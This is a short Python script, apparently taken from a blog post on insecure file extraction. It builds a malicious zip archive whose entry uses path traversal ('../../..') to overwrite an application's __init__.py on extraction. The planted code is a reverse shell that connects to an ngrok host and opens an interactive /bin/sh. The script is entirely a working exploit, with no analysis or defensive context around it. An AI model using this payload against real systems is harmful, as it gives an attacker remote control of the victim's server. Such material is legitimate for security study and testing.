# from https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution
import zipfile

z_info = zipfile.ZipInfo("../../../../../../../app/app/__init__.py")
z_file = zipfile.ZipFile("bad.zip", mode="w")
z_file.writestr(
	z_info,
	"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",19631));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);"""
)
z_info.external_attr = 0o777 << 16
z_file.close()
